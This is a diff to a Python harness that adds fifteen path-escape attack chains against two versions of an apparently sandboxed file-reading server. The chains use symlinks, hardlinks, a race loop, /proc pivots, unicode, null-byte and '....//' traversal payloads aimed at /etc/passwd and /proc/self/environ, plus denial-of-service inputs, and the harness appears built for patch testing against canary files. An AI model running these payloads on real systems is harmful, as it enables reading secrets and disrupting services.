@@ -24,10 +24,19 @@ import contextlib
 import json
 import re
 import subprocess
+import sys
 import time
 from dataclasses import dataclass, field
 from pathlib import Path
 from typing import Any
+
+# Windows console is cp1252 by default; force UTF-8 so unicode labels print.
+if hasattr(sys.stdout, "reconfigure"):
+    try:
+        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
+        sys.stderr.reconfigure(encoding="utf-8", errors="replace")
+    except Exception:
+        pass
 
 # ---------------------------------------------------------------------------
 # Constants
@@ -571,6 +580,437 @@ def run_primitives_phase() -> list[StepResult]:
         wipe_and_recreate(v)
         plant_primitives(v)
     return run_calls_both_versions(primitive_calls())
+
+
+# ---------------------------------------------------------------------------
+# Phase 3 — Attack chains. Each chain = setup fn + list of StepCall.
+# ---------------------------------------------------------------------------
+
+@dataclass
+class Chain:
+    chain_id: str
+    name: str
+    hypothesis: str
+    setup: Any   # callable(version: str) -> None
+    calls: Any   # callable() -> list[StepCall]
+
+
+# ---- C1: Prefix confusion ------------------------------------------------
+
+def setup_c1(version: str) -> None:
+    wipe_and_recreate(version)
+    sandbox = SANDBOXES[version]
+    wsl_bash(f"""
+        set -e
+        rm -rf {sandbox}_evil
+        mkdir -p {sandbox}_evil
+        printf '%s' {CANARY_FILE_CONTENT!r} > {sandbox}_evil/loot.txt
+    """)
+
+
+def calls_c1() -> list[StepCall]:
+    return [
+        StepCall("C1", 1, "mkdir {SANDBOX}_evil && plant loot",
+                 "read_file", "{SANDBOX}_evil/loot.txt",
+                 label="prefix-confusion — read loot in sibling dir"),
+        StepCall("C1", 2, "", "list_directory", "{SANDBOX}_evil",
+                 label="prefix-confusion — list sibling dir"),
+        StepCall("C1", 3, "", "read_file", "{SANDBOX}_evil/../victim_328/passwd_canary",
+                 label="prefix-confusion + traversal to victim"),
+    ]
+
+
+# ---- C2: Symlink plant → read --------------------------------------------
+
+def setup_c2(version: str) -> None:
+    wipe_and_recreate(version)
+    sandbox = SANDBOXES[version]
+    victim = VICTIMS[version]
+    wsl_bash(f"ln -sf {victim}/passwd_canary {sandbox}/link_to_canary")
+
+
+def calls_c2() -> list[StepCall]:
+    return [
+        StepCall("C2", 1, "ln -s {VICTIM}/passwd_canary {SANDBOX}/link_to_canary",
+                 "read_file", "{SANDBOX}/link_to_canary",
+                 label="basic symlink plant → read target"),
+        StepCall("C2", 2, "", "list_directory", "{SANDBOX}",
+                 label="list shows the symlink?"),
+    ]
+
+
+# ---- C3: Symlink chain ---------------------------------------------------
+
+def setup_c3(version: str) -> None:
+    wipe_and_recreate(version)
+    sandbox = SANDBOXES[version]
+    victim = VICTIMS[version]
+    wsl_bash(f"""
+        set -e
+        ln -sf {victim}/passwd_canary {sandbox}/chain_c
+        ln -sf {sandbox}/chain_c {sandbox}/chain_b
+        ln -sf {sandbox}/chain_b {sandbox}/chain_a
+    """)
+
+
+def calls_c3() -> list[StepCall]:
+    return [
+        StepCall("C3", 1, "3-link symlink chain A->B->C->canary",
+                 "read_file", "{SANDBOX}/chain_a",
+                 label="symlink chain to canary"),
+    ]
+
+
+# ---- C4: Symlink loop DoS ------------------------------------------------
+
+def setup_c4(version: str) -> None:
+    wipe_and_recreate(version)
+    sandbox = SANDBOXES[version]
+    wsl_bash(f"""
+        set -e
+        ln -sf {sandbox}/loop_b {sandbox}/loop_a
+        ln -sf {sandbox}/loop_a {sandbox}/loop_b
+    """)
+
+
+def calls_c4() -> list[StepCall]:
+    return [
+        StepCall("C4", 1, "ln -s A->B, B->A (loop)",
+                 "read_file", "{SANDBOX}/loop_a",
+                 label="symlink loop — hang or ELOOP?"),
+        StepCall("C4", 2, "", "list_directory", "{SANDBOX}/loop_a",
+                 label="list on loop target"),
+    ]
+
+
+# ---- C5: Dangling symlink info leak --------------------------------------
+
+def setup_c5(version: str) -> None:
+    wipe_and_recreate(version)
+    sandbox = SANDBOXES[version]
+    wsl_bash(f"ln -sf /var/never/exists/secret_target {sandbox}/dangling")
+
+
+def calls_c5() -> list[StepCall]:
+    return [
+        StepCall("C5", 1, "ln -s /var/never/exists/secret_target {SANDBOX}/dangling",
+                 "read_file", "{SANDBOX}/dangling",
+                 label="dangling symlink — does error echo target?"),
+    ]
+
+
+# ---- C6: Dir-symlink nested read -----------------------------------------
+
+def setup_c6(version: str) -> None:
+    wipe_and_recreate(version)
+    sandbox = SANDBOXES[version]
+    victim = VICTIMS[version]
+    wsl_bash(f"ln -sf {victim} {sandbox}/victim_link")
+
+
+def calls_c6() -> list[StepCall]:
+    return [
+        StepCall("C6", 1, "ln -s {VICTIM} {SANDBOX}/victim_link",
+                 "list_directory", "{SANDBOX}/victim_link",
+                 label="list dir-symlink pointing outside"),
+        StepCall("C6", 2, "", "read_file", "{SANDBOX}/victim_link/passwd_canary",
+                 label="read file under dir-symlink"),
+    ]
+
+
+# ---- C7: Parent-dir symlink ----------------------------------------------
+
+def setup_c7(version: str) -> None:
+    wipe_and_recreate(version)
+    sandbox = SANDBOXES[version]
+    wsl_bash(f"""
+        set -e
+        rm -f {sandbox}_indirect
+        ln -sf {sandbox} {sandbox}_indirect
+    """)
+
+
+def calls_c7() -> list[StepCall]:
+    return [
+        StepCall("C7", 1, "ln -s {SANDBOX} {SANDBOX}_indirect",
+                 "read_file", "{SANDBOX}_indirect/readme.txt",
+                 label="symlinked parent — does realpath match after resolve?"),
+    ]
+
+
+# ---- C8: HARDLINK ESCAPE (the main bet) ----------------------------------
+
+def setup_c8(version: str) -> None:
+    wipe_and_recreate(version)
+    sandbox = SANDBOXES[version]
+    victim = VICTIMS[version]
+    wsl_bash(f"ln {victim}/passwd_canary {sandbox}/hardlink_to_canary")
+
+
+def calls_c8() -> list[StepCall]:
+    return [
+        StepCall("C8", 1, "ln {VICTIM}/passwd_canary {SANDBOX}/hardlink_to_canary",
+                 "read_file", "{SANDBOX}/hardlink_to_canary",
+                 label="HARDLINK BET — read canary through inode-aliased file"),
+        StepCall("C8", 2, "", "list_directory", "{SANDBOX}",
+                 label="does listing reveal the hardlink as normal file?"),
+    ]
+
+
+# ---- C9: TOCTOU race -----------------------------------------------------
+
+def setup_c9(version: str) -> None:
+    wipe_and_recreate(version)
+    sandbox = SANDBOXES[version]
+    wsl_bash(f"echo benign > {sandbox}/race_target")
+
+
+def calls_c9() -> list[StepCall]:
+    return [
+        StepCall("C9", i, "background shell rotating race_target file<->symlink",
+                 "read_file", "{SANDBOX}/race_target",
+                 label=f"race attempt #{i}")
+        for i in range(1, 21)
+    ]
+
+
+@contextlib.contextmanager
+def swap_loop(version: str):
+    """Background loop in WSL that rotates race_target between a benign file
+    and a symlink to the canary. Bounded by RACE_BUDGET_SEC."""
+    sandbox = SANDBOXES[version]
+    victim = VICTIMS[version]
+    script = f"""
+        end=$(( $(date +%s) + {RACE_BUDGET_SEC} ))
+        while [ $(date +%s) -lt $end ]; do
+            ln -sf {victim}/passwd_canary {sandbox}/race_target.new 2>/dev/null
+            mv -f {sandbox}/race_target.new {sandbox}/race_target 2>/dev/null
+            echo benign > {sandbox}/race_target.tmp 2>/dev/null
+            mv -f {sandbox}/race_target.tmp {sandbox}/race_target 2>/dev/null
+        done
+    """
+    proc = subprocess.Popen(
+        ["wsl", "bash", "-lc", script],
+        stdout=subprocess.DEVNULL,
+        stderr=subprocess.DEVNULL,
+    )
+    try:
+        yield
+    finally:
+        proc.kill()
+        try:
+            proc.wait(timeout=5)
+        except Exception:
+            pass
+
+
+# ---- C10: Procfs pivot ---------------------------------------------------
+
+def setup_c10(version: str) -> None:
+    wipe_and_recreate(version)
+
+
+def calls_c10() -> list[StepCall]:
+    return [
+        StepCall("C10", 1, "", "read_file", "/proc/self/root/etc/passwd",
+                 label="procfs self/root — absolute"),
+        StepCall("C10", 2, "", "read_file", "{SANDBOX}/../proc/self/root/etc/passwd",
+                 label="procfs via relative"),
+        StepCall("C10", 3, "", "read_file", "/proc/1/root/etc/passwd",
+                 label="pid 1 root view"),
+        StepCall("C10", 4, "", "read_file", "/proc/self/cwd/readme.txt",
+                 label="procfs self/cwd"),
+        StepCall("C10", 5, "", "read_file", "/proc/self/environ",
+                 label="process environment leak"),
+    ]
+
+
+# ---- C11: Unicode normalization ------------------------------------------
+
+def setup_c11(version: str) -> None:
+    wipe_and_recreate(version)
+    sandbox = SANDBOXES[version]
+    wsl_python(f"""
+import os
+open({sandbox!r} + '/cafe\\u0301_nfd.txt', 'w').write('NFD-named file\\n')
+open({sandbox!r} + '/caf\\u00e9_nfc.txt', 'w').write('NFC-named file\\n')
+""")
+
+
+def calls_c11() -> list[StepCall]:
+    return [
+        StepCall("C11", 1, "plant NFD-named file",
+                 "read_file", "{SANDBOX}/caf\u00e9_nfd.txt",
+                 label="NFC query → NFD file"),
+        StepCall("C11", 2, "plant NFC-named file",
+                 "read_file", "{SANDBOX}/cafe\u0301_nfc.txt",
+                 label="NFD query → NFC file"),
+        StepCall("C11", 3, "", "read_file", "{SANDBOX}/\uff0e\uff0e/etc/passwd",
+                 label="fullwidth .. (U+FF0E) traversal"),
+        StepCall("C11", 4, "", "read_file", "{SANDBOX}\u202e/etc/passwd",
+                 label="RTL override injection"),
+    ]
+
+
+# ---- C12: Null-byte / control-char truncation ----------------------------
+
+def setup_c12(version: str) -> None:
+    wipe_and_recreate(version)
+
+
+def calls_c12() -> list[StepCall]:
+    return [
+        StepCall("C12", 1, "", "read_file", "{SANDBOX}/readme.txt\x00/etc/passwd",
+                 label="null-byte truncation"),
+        StepCall("C12", 2, "", "read_file", "{SANDBOX}/readme.txt\x00{VICTIM}/passwd_canary",
+                 label="null-byte to victim canary"),
+        StepCall("C12", 3, "", "read_file", "{SANDBOX}\x00/../etc/passwd",
+                 label="null inside directory segment"),
+        StepCall("C12", 4, "", "read_file", "{SANDBOX}/readme.txt\n/etc/passwd",
+                 label="CRLF injection"),
+    ]
+
+
+# ---- C13: CVE-53110 mutation family --------------------------------------
+
+def setup_c13(version: str) -> None:
+    wipe_and_recreate(version)
+
+
+def calls_c13() -> list[StepCall]:
+    return [
+        StepCall("C13", 1, "", "read_file", "{SANDBOX}/....//....//etc/passwd",
+                 label="CVE-53110 literal pattern"),
+        StepCall("C13", 2, "", "read_file", "{SANDBOX}/.....///.....///etc/passwd",
+                 label="5-dot extension"),
+        StepCall("C13", 3, "", "read_file", "{SANDBOX}/....\\/....\\/etc/passwd",
+                 label="mixed backslash"),
+        StepCall("C13", 4, "", "read_file",
+                 "{SANDBOX}/%2e%2e%2e%2e//%2e%2e%2e%2e//etc/passwd",
+                 label="URL-encoded 4-dot"),
+        StepCall("C13", 5, "", "read_file", "{SANDBOX}/....///etc/passwd",
+                 label="asymmetric 4-dot"),
+        StepCall("C13", 6, "", "read_file", "{SANDBOX}/...//../etc/passwd",
+                 label="3-dot with 2-dot chaser"),
+    ]
+
+
+# ---- C14: Type confusion / JSON-RPC smuggling ----------------------------
+
+def setup_c14(version: str) -> None:
+    wipe_and_recreate(version)
+
+
+def calls_c14() -> list[StepCall]:
+    return [
+        StepCall("C14", 1, "", "read_file", [], label="empty array as path"),
+        StepCall("C14", 2, "", "read_file", ["{SANDBOX}/readme.txt"],
+                 label="array with one valid path"),
+        StepCall("C14", 3, "", "read_file", {"path": "{SANDBOX}/readme.txt"},
+                 label="object as path"),
+        StepCall("C14", 4, "", "read_file", None, label="null as path"),
+        StepCall("C14", 5, "", "read_file", 0, label="integer 0 as path"),
+        StepCall("C14", 6, "", "read_file", True, label="boolean true as path"),
+        StepCall("C14", 7, "", "read_file", "{SANDBOX}/readme.txt",
+                 extra_args={"__proto__": {"polluted": True}},
+                 label="prototype pollution extra arg"),
+        StepCall("C14", 8, "", "read_file", "a" * (1024 * 1024),
+                 label="1 MB path string"),
+    ]
+
+
+# ---- C15: Resource exhaustion --------------------------------------------
+
+def setup_c15(version: str) -> None:
+    wipe_and_recreate(version)
+    sandbox = SANDBOXES[version]
+    wsl_bash(f"""
+        set -e
+        ln -sf /dev/zero {sandbox}/zero_link
+        mkfifo {sandbox}/fifo_link 2>/dev/null || true
+    """)
+
+
+def calls_c15() -> list[StepCall]:
+    return [
+        StepCall("C15", 1, "ln -s /dev/zero {SANDBOX}/zero_link",
+                 "read_file", "{SANDBOX}/zero_link",
+                 label="/dev/zero via symlink — DoS"),
+        StepCall("C15", 2, "mkfifo {SANDBOX}/fifo_link",
+                 "read_file", "{SANDBOX}/fifo_link",
+                 label="FIFO read — hang DoS"),
+        StepCall("C15", 3, "", "read_file", "{SANDBOX}/" + "a" * 4000 + ".txt",
+                 label="PATH_MAX-length path"),
+        StepCall("C15", 4, "", "list_directory",
+                 "{SANDBOX}/" + "/".join(["x"] * 200),
+                 label="200-segment deep non-existent path"),
+    ]
+
+
+# ---- Chain registry ------------------------------------------------------
+
+CHAINS: list[Chain] = [
+    Chain("C1", "Prefix confusion",
+          "Allow-list check uses startsWith without trailing slash.",
+          setup_c1, calls_c1),
+    Chain("C2", "Symlink plant → read",
+          "Server follows externally-planted symlinks to targets outside sandbox.",
+          setup_c2, calls_c2),
+    Chain("C3", "Symlink chain",
+          "Realpath walks multi-hop symlink chains.",
+          setup_c3, calls_c3),
+    Chain("C4", "Symlink loop DoS",
+          "A→B, B→A loop causes hang or ELOOP.",
+          setup_c4, calls_c4),
+    Chain("C5", "Dangling symlink info leak",
+          "Broken symlink's error message echoes the target path.",
+          setup_c5, calls_c5),
+    Chain("C6", "Dir-symlink nested read",
+          "sandbox/link→victim dir; read files under it.",
+          setup_c6, calls_c6),
+    Chain("C7", "Parent-dir symlink",
+          "Server may not realpath the path against allowed-dir realpath.",
+          setup_c7, calls_c7),
+    Chain("C8", "Hardlink escape",
+          "Realpath cannot detect hardlinks; file inside sandbox aliases canary inode.",
+          setup_c8, calls_c8),
+    Chain("C9", "TOCTOU race",
+          "Swap race_target between file and symlink while hammering read_file.",
+          setup_c9, calls_c9),
+    Chain("C10", "Procfs pivot",
+          "Escape via /proc/self/root, /proc/self/cwd, /proc/1/root.",
+          setup_c10, calls_c10),
+    Chain("C11", "Unicode normalization",
+          "NFC ≠ NFD; fullwidth; RTL override — parser vs kernel mismatch.",
+          setup_c11, calls_c11),
+    Chain("C12", "Null-byte / control-char truncation",
+          "C-string vs JS-string mismatch in path handling.",
+          setup_c12, calls_c12),
+    Chain("C13", "CVE-53110 mutation family",
+          "Does the patch catch only the literal `....//` pattern?",
+          setup_c13, calls_c13),
+    Chain("C14", "Type confusion / JSON-RPC smuggling",
+          "Non-string path, prototype pollution, 1 MB string.",
+          setup_c14, calls_c14),
+    Chain("C15", "Resource exhaustion",
+          "/dev/zero, FIFO hang, PATH_MAX, deep path.",
+          setup_c15, calls_c15),
+]
+
+
+def run_chains_phase(chains: list[Chain]) -> list[StepResult]:
+    print(f"\n[Phase 3] Attack chains ({len(chains)})")
+    all_results: list[StepResult] = []
+    for chain in chains:
+        print(f"\n  {chain.chain_id} — {chain.name}")
+        for v in SANDBOXES:
+            chain.setup(v)
+        if chain.chain_id == "C9":
+            with swap_loop("328"), swap_loop("729"):
+                all_results.extend(run_calls_both_versions(chain.calls()))
+        else:
+            all_results.extend(run_calls_both_versions(chain.calls()))
+    return all_results
 
 
 def main() -> None:
